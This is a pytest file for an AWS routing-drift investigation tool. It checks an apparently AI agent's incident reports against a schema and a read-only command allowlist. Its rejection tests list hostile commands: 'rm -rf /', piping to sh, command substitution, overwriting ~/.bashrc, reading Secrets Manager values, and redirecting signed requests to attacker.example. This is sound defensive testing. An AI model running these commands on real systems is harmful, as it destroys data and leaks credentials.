# Copyright (c) 2026 Amazon Web Services
# Licensed under the MIT-0 License
# See LICENSE file in the project root for full license information.
"""investigation.py: extraction, batch-scoped schema validation, ranking, MergeInvestigations (tasks.md 3.3)."""

import copy
import json

import pytest

from drift_core import investigation as inv
from drift_core.cross_account import (
    event_forwarder_role_name,
    is_cross_account,
    journal_reader_role_arn,
    journal_reader_role_name,
    parse_function_arn,
)

PROD = ("prod", "production")
RUN = "2026-10-13T05:00:00Z-a1b2c3d4"


def fid(n):
    return f"f-{n:020x}"


def incident(members, rank=1, env="prod", prefixes=1, attachments=0, domains=1, confidence="high", title=None,
             commands=None):
    return {
        "rank": rank, "title": title or f"incident {members[0]}", "member_finding_ids": members,
        "root_cause_hypothesis": "Route removed by a change", "confidence": confidence,
        "evidence": [{"type": "cloudtrail", "event_id": "e-1", "event_name": "DeleteTransitGatewayRoute",
                      "time": "2026-10-12T10:00:00Z", "actor": "unknown"},
                     {"type": "health", "event_arn": "arn:aws:health:us-east-1::event/X"},
                     {"type": "state", "resource": "dxvif-1", "observation": "bgpStatus=down"}],
        "actor_identified": False,
        "blast_radius": {"prefixes": prefixes, "attachments": attachments, "domains": domains, "environment": env,
                         "score": 99999},
        "stable_for": "P0D",
        "validation_commands": commands if commands is not None else [
            "aws ec2 search-transit-gateway-routes --transit-gateway-route-table-id tgw-rtb-1 --filters x",
            "aws directconnect describe-virtual-interfaces --virtual-interface-id dxvif-1"],
    }


def result(batch_n, incidents, unassigned=()):
    return {"schema": "nrdc-investigation/v1", "incidentId": f"nrdc-{RUN}-{batch_n}",
            "investigation_url": "https://space.aidevops.global.app.aws/investigation/t1",
            "incidents": incidents, "unassigned_finding_ids": list(unassigned), "notes": "n", "extra": "dropped"}


BATCH1 = [fid(1), fid(2), fid(3)]
BATCH2 = [fid(4), fid(5)]


def valid_batch1():
    return result(1, [incident([fid(1), fid(2)], rank=1), incident([fid(3)], rank=2, env="dev")])


# --- Schema -----------------------------------------------------------------------------------------

def test_schema_file_loads_with_id():
    schema = inv.load_schema()
    assert schema["$id"] == "nrdc-investigation/v1" and "incident" in schema["$defs"]


def test_valid_result_passes():
    assert inv.validate_result(valid_batch1(), f"nrdc-{RUN}-1", BATCH1) == []


def test_unassigned_counts_toward_partition():
    doc = result(1, [incident([fid(1), fid(2)])], unassigned=[fid(3)])
    assert inv.validate_result(doc, f"nrdc-{RUN}-1", BATCH1) == []


def test_missing_ids_rejected():
    doc = result(1, [incident([fid(1)])])
    errors = inv.validate_result(doc, f"nrdc-{RUN}-1", BATCH1)
    assert any("missing" in e and fid(2) in e for e in errors)


def test_foreign_batch_id_rejected():
    doc = valid_batch1()
    doc["unassigned_finding_ids"] = [fid(4)]
    errors = inv.validate_result(doc, f"nrdc-{RUN}-1", BATCH1)
    assert any("not in this batch" in e and fid(4) in e for e in errors)


def test_duplicate_id_rejected():
    doc = valid_batch1()
    doc["unassigned_finding_ids"] = [fid(1)]
    assert any("more than once" in e for e in inv.validate_result(doc, f"nrdc-{RUN}-1", BATCH1))


@pytest.mark.parametrize("command", [
    "aws ec2 delete-transit-gateway-route --transit-gateway-route-table-id tgw-rtb-1",
    "aws ec2 modify-transit-gateway --transit-gateway-id tgw-1",
    "aws ec2 create-route",
    "ec2 describe-transit-gateways",
    "aws EC2 describe-transit-gateways",
    "aws ec2 describe-transit-gateways; aws ec2 delete-vpc --vpc-id vpc-1",
    "aws ec2 describe-transit-gateways && rm -rf /",
    "aws ec2 describe-transit-gateways | sh",
    "aws ec2 describe-transit-gateways `id`",
    "aws ec2 describe-transit-gateways $(id)",
    "aws ec2 describe-transit-gateways > /tmp/x",
    "aws ec2 describe-transit-gateways\naws ec2 delete-vpc",
])
def test_bad_validation_commands_rejected(command):
    doc = result(1, [incident(BATCH1, commands=[command])])
    assert inv.validate_result(doc, f"nrdc-{RUN}-1", BATCH1) != []


@pytest.mark.parametrize("command", [
    # pre-release security review 2026-10-19 (T3/T4): these matched the old schema-only pattern
    # (`^aws [a-z0-9-]+ (describe|get|list|search)-...`) and were ACCEPTED before this fix.
    # s3api get-object's last argument is the local output file: this one overwrites it.
    "aws s3api get-object --bucket example-bucket --key k ~/.bashrc",
    # Right verb, wrong service: exfiltrates a secret into the "read-only" report.
    "aws secretsmanager get-secret-value --secret-id prod/db",
    # Redirects the signed request to an attacker-controlled host.
    "aws ec2 describe-vpcs --endpoint-url https://attacker.example",
    # Same idea via the other URL-control flags.
    "aws ec2 describe-vpcs --cli-input-json file://evil.json",
    "aws ec2 describe-vpcs --cli-input-yaml fileb://evil.yaml",
    "aws ec2 describe-vpcs --no-verify-ssl",
    "aws ec2 describe-vpcs --ca-bundle /tmp/evil.pem",
    # A trailing positional after an otherwise-valid, in-allowlist command.
    "aws ec2 describe-vpcs  sh",
    "aws ec2 describe-vpcs extra-positional-arg",
])
def test_security_review_attack_commands_rejected(command):
    """Each of these is a specific exploit the security review demonstrated against the pre-fix validator
    by calling validate_result directly; every one must be rejected by the fixed checks."""
    doc = result(1, [incident(BATCH1, commands=[command])])
    assert inv.validate_result(doc, f"nrdc-{RUN}-1", BATCH1) != []


@pytest.mark.parametrize("command", [
    "aws ec2 describe-transit-gateway-route-tables --region eu-central-1",
    "aws networkmanager get-network-routes --global-network-id g-1",
    "aws networkmanager list-attachments",
    "aws ec2 search-transit-gateway-routes --filters Name=state,Values=active",
])
def test_read_only_validation_commands_accepted(command):
    doc = result(1, [incident(BATCH1, commands=[command])])
    assert inv.validate_result(doc, f"nrdc-{RUN}-1", BATCH1) == []


@pytest.mark.parametrize("ranks", [[1, 1], [2, 3], [0, 1], [1, 3]])
def test_bad_rank_permutation_rejected(ranks):
    doc = result(1, [incident([fid(1), fid(2)], rank=ranks[0]), incident([fid(3)], rank=ranks[1])])
    assert inv.validate_result(doc, f"nrdc-{RUN}-1", BATCH1) != []


@pytest.mark.parametrize("mutate", [
    lambda d: d.update(schema="nrdc-investigation/v2"),
    lambda d: d.pop("incidents"),
    lambda d: d.pop("unassigned_finding_ids"),
    lambda d: d.update(incidentId=f"nrdc-{RUN}-2"),
    lambda d: d.update(investigation_url="http://insecure.example"),
    lambda d: d["incidents"][0].update(confidence="certain"),
    lambda d: d["incidents"][0].update(rank=True),
    lambda d: d["incidents"][0].update(member_finding_ids=[]),
    lambda d: d["incidents"][0].update(member_finding_ids=["not-an-id"]),
    lambda d: d["incidents"][0].update(stable_for="14 days"),
    lambda d: d["incidents"][0].update(actor_identified="no"),
    lambda d: d["incidents"][0]["blast_radius"].update(prefixes=-1),
    lambda d: d["incidents"][0]["blast_radius"].pop("environment"),
    lambda d: d["incidents"][0].update(evidence=[{"type": "cloudtrail"}]),
    lambda d: d["incidents"][0].update(evidence=[{"type": "guess", "note": "probably"}]),
    lambda d: d["incidents"][0].update(title="x" * 301),
    lambda d: d.update(incidents="none"),
])
def test_schema_violations_rejected(mutate):
    doc = valid_batch1()
    mutate(doc)
    assert inv.validate_result(doc, f"nrdc-{RUN}-1", BATCH1) != []


def test_unsupported_ref_raises():
    with pytest.raises(ValueError):
        inv.schema_errors({}, {"$ref": "http://example.com/x"})


def test_two_batches_each_with_only_its_own_ids_validate():
    """Regression for the whole-run-set bug: each callback sees only its batch's findings."""
    doc1 = valid_batch1()
    doc2 = result(2, [incident(BATCH2, rank=1)])
    assert inv.validate_result(doc1, f"nrdc-{RUN}-1", BATCH1) == []
    assert inv.validate_result(doc2, f"nrdc-{RUN}-2", BATCH2) == []
    # and neither validates against the other batch
    assert inv.validate_result(doc1, f"nrdc-{RUN}-2", BATCH2) != []


# --- Extraction ------------------------------------------------------------------------------------

def test_extract_block_last_matching_fence():
    text = ("analysis...\n```json\n{\"other\": 1}\n```\n"
            f"```nrdc-investigation/v1\n{json.dumps({'schema': 'old'})}\n```\n"
            f"Final:\n```json\n{json.dumps(valid_batch1())}\n```\n")
    status, doc = inv.extract_block(text)
    assert status == "ok" and doc["incidentId"] == f"nrdc-{RUN}-1"


def test_extract_block_none_and_invalid():
    assert inv.extract_block("no fences here") == ("none", None)
    assert inv.extract_block("```json\n{\"a\": 1}\n```") == ("none", None)
    assert inv.extract_block("```nrdc-investigation/v1\n{not json\n```") == ("invalid", None)
    assert inv.extract_block('```json\n["nrdc-investigation/v1"]\n```') == ("invalid", None)
    assert inv.extract_block(None) == ("none", None)


def test_extract_investigation_id():
    text = f"[INVESTIGATION_ID:nrdc-{RUN}-3]\nNETWORK ROUTING DRIFT"
    assert inv.extract_investigation_id(text) == f"nrdc-{RUN}-3"
    assert inv.extract_investigation_id("[INVESTIGATION_ID:health-abc]") is None
    assert inv.extract_investigation_id("") is None


# --- Ranking -----------------------------------------------------------------------------------------

def test_env_weight_and_score():
    assert inv.env_weight("PROD ", PROD) == 10 and inv.env_weight("shared", PROD) == 3
    assert inv.env_weight("dev", PROD) == 1 and inv.env_weight("live", ("live",)) == 10
    assert inv.blast_radius_score({"prefixes": 12, "attachments": 1, "domains": 1, "environment": "prod"},
                                  PROD) == 1220


def _normalized(doc, kinds):
    return inv.normalize(doc, finding_kinds=kinds, production_values=PROD, default_url="https://space.aidevops.global.app.aws/investigation/default")


def test_normalize_recomputes_score_and_reorders_agent_rank_is_advisory():
    # agent ranks dev first; equal counts -> code puts prod first
    doc = result(1, [incident([fid(3)], rank=1, env="dev"), incident([fid(1), fid(2)], rank=2, env="prod")])
    out = _normalized(doc, {})
    assert [i["blast_radius"]["environment"] for i in out["incidents"]] == ["prod", "dev"]
    assert [i["rank"] for i in out["incidents"]] == [1, 2] and out["incidents"][0]["agent_rank"] == 2
    assert out["incidents"][0]["blast_radius"]["score"] == 1010  # not the agent's 99999
    assert "extra" not in out and out["investigation_url"].startswith("https://space")


def test_ties_broken_by_confidence_then_kind_order():
    kinds = {fid(1): "limit-threshold", fid(2): "blackhole-route", fid(3): "blackhole-route"}
    doc = result(1, [incident([fid(1)], rank=1, title="a"), incident([fid(2)], rank=2, title="b"),
                     incident([fid(3)], rank=3, title="c", confidence="low")])
    out = _normalized(doc, kinds)
    assert [i["title"] for i in out["incidents"]] == ["b", "a", "c"]


def test_default_url_used_when_agent_omits_it():
    doc = valid_batch1()
    del doc["investigation_url"]
    assert _normalized(doc, {})["investigation_url"] == "https://space.aidevops.global.app.aws/investigation/default"


# --- MergeInvestigations ---------------------------------------------------------------------------

BATCHES = [{"batch_n": 1, "incident_id": f"nrdc-{RUN}-1", "finding_ids": BATCH1},
           {"batch_n": 2, "incident_id": f"nrdc-{RUN}-2", "finding_ids": BATCH2},
           {"batch_n": 3, "incident_id": f"nrdc-{RUN}-3", "finding_ids": [fid(6)]}]
NEW = BATCH1 + BATCH2 + [fid(6)]


def _ok(doc):
    return {"status": "ok", "result": _normalized(doc, {})}


def test_merge_union_with_a_failed_batch():
    outcomes = {1: _ok(valid_batch1()), 2: _ok(result(2, [incident([fid(4)])], unassigned=[fid(5)])),
                3: {"status": "failed", "reason": "timeout-never-started"}}
    merged = inv.merge_investigations(NEW, BATCHES, outcomes, {})
    assert merged["invariant"] == {"missing": [], "unexpected": [], "duplicated": [], "ok": True}
    assert merged["ok_batches"] == 2 and merged["failed_batches"] == 1
    assert [b["status"] for b in merged["batches"]] == ["ok", "ok", "failed:timeout-never-started"]
    assert merged["batches"][1]["unassigned_finding_ids"] == [fid(5)]


def test_merge_missing_outcome_counts_as_failed():
    merged = inv.merge_investigations(NEW, BATCHES, {1: _ok(valid_batch1())}, {})
    assert merged["failed_batches"] == 2 and merged["invariant"]["ok"]
    assert merged["batches"][2]["status"] == "failed:no result"


def test_merge_invariant_violation_is_reported():
    outcomes = {n: {"status": "failed", "reason": "x"} for n in (1, 2, 3)}
    merged = inv.merge_investigations(NEW + [fid(9)], BATCHES + [dict(BATCHES[0], batch_n=4)], outcomes, {})
    assert merged["invariant"]["ok"] is False
    assert merged["invariant"]["missing"] == [fid(9)] and fid(1) in merged["invariant"]["duplicated"]
    merged = inv.merge_investigations(BATCH1, BATCHES[:2], outcomes, {})
    assert merged["invariant"]["unexpected"] == BATCH2


def test_merge_resorts_across_batches_prod_above_dev():
    # batch 1's best incident is dev, batch 2's is prod, equal counts -> prod first overall
    b1 = result(1, [incident(BATCH1, rank=1, env="dev", title="dev-incident")])
    b2 = result(2, [incident(BATCH2, rank=1, env="prod", title="prod-incident")])
    merged = inv.merge_investigations(BATCH1 + BATCH2, BATCHES[:2], {1: _ok(b1), 2: _ok(b2)}, {})
    assert [(i["title"], i["rank"], i["batch_n"]) for i in merged["incidents"]] == [
        ("prod-incident", 1, 2), ("dev-incident", 2, 1)]
    assert merged["incidents"][0]["investigation_url"].startswith("https://")


def test_normalize_does_not_mutate_input():
    doc = valid_batch1()
    before = copy.deepcopy(doc)
    _normalized(doc, {})
    assert doc == before


# --- Cross-account names (D§3.3a) -----------------------------------------------------------------

def test_role_names_and_arn():
    assert journal_reader_role_name("111111111111", "us-east-1") == "nrdc-journal-reader-111111111111-us-east-1"
    assert event_forwarder_role_name("111111111111", "us-east-1") == "nrdc-event-forwarder-111111111111-us-east-1"
    assert journal_reader_role_arn("222222222222", "111111111111", "us-east-1") == \
        "arn:aws:iam::222222222222:role/nrdc-journal-reader-111111111111-us-east-1"
    assert journal_reader_role_arn("222222222222", "111111111111", "cn-north-1", "aws-cn").startswith("arn:aws-cn:")


@pytest.mark.parametrize("args", [("1111", "us-east-1"), ("111111111111", ""), ("111111111111", "us east")])
def test_role_name_input_validation(args):
    with pytest.raises(ValueError):
        journal_reader_role_name(*args)


def test_role_name_length_and_bad_devops_account():
    with pytest.raises(ValueError):
        journal_reader_role_name("111111111111", "x" * 40)
    with pytest.raises(ValueError):
        journal_reader_role_arn("abc", "111111111111", "us-east-1")


def test_parse_function_arn_and_switch():
    assert parse_function_arn("arn:aws:lambda:eu-central-1:111111111111:function:cb") == \
        ("aws", "eu-central-1", "111111111111")
    for bad in ("", "arn:aws:s3:::bucket", "arn:aws:lambda::111111111111:function:x"):
        with pytest.raises(ValueError):
            parse_function_arn(bad)
    assert not is_cross_account("", "111111111111")
    assert not is_cross_account("111111111111", "111111111111")
    assert is_cross_account("222222222222", "111111111111")


@pytest.mark.parametrize("candidate, expected", [
    ("https://space.aidevops.global.app.aws/investigation/t9", "https://space.aidevops.global.app.aws/investigation/t9"),
    ("https://evil.example.com/investigation/t1", "DEFAULT"),
    ("https://space.aidevops.global.app.aws.evil.example.com/x", "DEFAULT"),
    ("https://space.aidevops.global.app.aws/investigation/t1 extra", "DEFAULT"),
    (None, "DEFAULT"),
    (42, "DEFAULT"),
])
def test_investigation_url_must_point_into_the_agent_space(candidate, expected):
    default = "https://space.aidevops.global.app.aws/investigation/t1"
    assert inv._trusted_url(candidate, default) == (default if expected == "DEFAULT" else expected)
